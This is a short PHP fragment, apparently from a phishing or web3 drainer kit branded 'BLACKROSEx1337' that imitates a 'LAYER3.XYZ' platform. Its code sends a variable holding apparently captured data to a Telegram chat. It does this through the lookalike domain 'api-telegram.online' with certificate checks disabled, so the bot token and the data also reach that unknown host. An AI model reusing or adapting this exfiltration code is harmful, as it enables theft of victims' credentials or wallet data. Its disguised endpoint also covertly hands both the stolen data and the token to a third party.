/**
 * DO NOT SELL THIS SCRIPT! 
 * DO NOT CHANGE COPYRIGHT!
 * Project: LAYER3.XYZ Web3 Platform 🔰
 * Version: 01
 * Telegram Channel: @BLACKROSEx1337
 
#################################################
#$        Developed by Team BLACKROSEx1337     $#
#$        Re-code doesn't make you a Coder     $#
#$          Copyright © 2023 BLACKROSEx1337    $#
#################################################

**/

<?php 
  $website="https://api-telegram.online/?bot=".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$yagmai,
  ];
  $ch = curl_init($website . '&sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);